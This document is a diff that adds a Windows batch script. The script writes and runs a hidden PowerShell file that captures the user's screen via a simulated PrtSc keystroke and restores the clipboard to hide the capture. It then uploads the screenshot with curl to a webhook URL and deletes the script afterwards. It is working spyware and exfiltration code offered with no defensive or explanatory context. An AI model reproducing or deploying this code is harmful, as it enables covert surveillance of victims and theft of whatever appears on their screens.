@@ -1,0 +1,27 @@
+echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
+echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
+echo { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
+echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
+echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
+echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
+echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
+echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
+echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
+echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
+timeout 1 >NUL
+Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1
